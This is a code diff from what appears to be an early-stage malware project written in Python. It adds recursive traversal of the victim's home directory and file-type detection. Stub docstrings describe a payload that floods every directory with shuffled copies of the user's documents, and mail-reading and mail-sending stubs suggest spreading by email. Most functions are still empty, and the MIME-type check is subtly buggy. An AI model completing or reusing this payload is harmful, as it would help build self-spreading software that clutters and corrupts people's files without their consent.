@@ -15,12 +15,14 @@ do not abuse it to cause any harm!
 # ------------------------------- imports ----------------------------------
 # --------------------------------------------------------------------------
 
-import os
+from os import listdir
+from os.path import expanduser, islink, isdir, isfile
+import mimetypes
 
 
 
 # --------------------------------------------------------------------------
-# --------------------------- global variables -----------------------------
+# -------------------- global variables and constants ----------------------
 # --------------------------------------------------------------------------
 
 FILES_TO_WRITE_PER_DIR = 10
@@ -32,33 +34,113 @@ FILES_TO_WRITE_PER_DIR = 10
 # ----------------------- payload helper functions -------------------------
 # --------------------------------------------------------------------------
 
-# Returns the user's home directory
 def users_home_dir():
-    pass
+    """
+    :returns: the user's home directory on both Unix and Windows platforms
+    """
+    # return expanduser("~")
+    return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
 
-def payload_helper(cur_dir):
-    pass
-    # for file : current_dir
-    ### if file is a dir that's not .. or ., recursively call browse_dirs(file)
-    ### if file is a normal file
-    ### Perform each of the following file checks using the file name extension (e.g. ".txt"), the MIME type, and the magic number (MIME sniffing)
-    ##### if file is a text file, produce FILES_TO_WRITE_PER_DIR new files where each file contains the content of this text file, but with randomly shuffled content.
-    ##### if file is a .doc or .docx file, do the same as for text files.
-    ##### if file is a .odt file, do the same as for text files.
-    ##### if file is a picture (.png, .jpeg, .jpg), try to recognize content from file name and load similar pictures from the internet (startpage search)
-    ##### if file is a music file (.mp3, .ogg, ...), do the same as for pictures
+
+def is_file_type(file, filetype):
+    """
+    :file:     a relative or absolute file path
+    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
+               "odt", "ogg", "png", "txt", "wav"
+    :returns: `True` if the passed `file` is of the specified file type, false otherwise
+    """
+    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
+                  "jpeg" : "image/jpeg", 
+                  "jpg" : "image/jpeg", 
+                  "mp3" : "audio/mpeg", 
+                  "mp4" : "video/mp4",
+                  "odt" : "application/vnd.oasis.opendocument.text", 
+                  "ogg" : "audio/ogg", 
+                  "png" : "image/png", 
+                  "txt" : "text/plain", 
+                  "wav" : "audio/x-wav"}
+    if file.endswith(filetype):
+        return True
+    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
+    # Provide function which determines the MIME type without having 
+    # the file name extension instead (otherwise, this check doesn't make much sense).
+    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
+        return True
+    return False
+
+
+# TODO: Ensure that the function does not simply terminate in the event 
+# of an access or write error (e.g. if access rights are missing).
+def traverse_dirs(curr_file):
+    """
+    Recursively traverses all directories and subdirectories
+    starting from `curr_file` and calls the appropriate 
+    processing function for each file.
+    """
+    if islink(curr_file):
+        print("detected symlink {}".format(curr_file))
+        # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
+        return
+    if isfile(curr_file):
+        if is_file_type(curr_file, "txt"):
+            print("TEXT file {}".format(curr_file))
+            process_text_file(curr_file)
+        elif is_file_type(curr_file, "docx"):
+            print("DOCX file {}".format(curr_file))
+            process_docx_file(curr_file)
+        elif is_file_type(curr_file, "odt"):
+            print("ODT file {}".format(curr_file))
+            process_odt_file(curr_file)
+        elif is_file_type(curr_file, "jpeg") or is_file_type(curr_file, "jpg") or is_file_type(curr_file, "png"):
+            print("image file {}".format(curr_file))
+            process_image_file(curr_file)
+        elif is_file_type(curr_file, "mp3") or is_file_type(curr_file, "ogg"):
+            print("music file {}".format(curr_file))
+            process_music_file(curr_file)
+    if isdir(curr_file):
+        print("DIR {}".format(curr_file))
+        for file in listdir(curr_file):
+            # TODO: Adapt for Windows ("\" instead of "/").
+            traverse_dirs("{}/{}".format(curr_file, file))
     
-def process_picture():
-    # NOTE: Maybe, it is useful to split this function into a function for PNG, JPEG, etc., or even to merge it with the function for processing DOC(X) files.
+    
+def process_text_file(file):
+    """
+    Produces FILES_TO_WRITE_PER_DIR new text files where each file contains 
+    the content of this text file, but with randomly shuffled content.
+    """
     pass
 
-def process_doc():
+
+def process_docx_file(file):
+    """
+    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
+    the content of this text file, but with randomly shuffled content.
+    """
     pass
 
-def process_picture():
+
+def process_odt_file(file):
+    """
+    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
+    the content of this text file, but with randomly shuffled content.
+    """
     pass
 
-def process_music():
+    
+def process_image_file(file):
+    """
+    Tries to recognize content from file name and loads similar pictures 
+    from the internet using a startpage search.
+    """
+    pass
+
+
+def process_music_file(file):
+    """
+    Tries to recognize content from file name and metadata and loads similar
+    music from the internet using a startpage search.
+    """
     pass
 
 
@@ -77,7 +159,7 @@ def send_mails_thunderbird():
 def read_mails_outlook():
     pass
 
-def send_mails_thunderbird:
+def send_mails_thunderbird():
     pass
 
 
@@ -95,7 +177,7 @@ and containing the content of the read file, but with the words randomly shuffle
 """
 def payload():
     print("Started browsing dirs...") # test output
-    browse_dirs(users_home_dir())
+    traverse_dirs(users_home_dir())
     print("Finished browsing dirs!") # test output
 
     
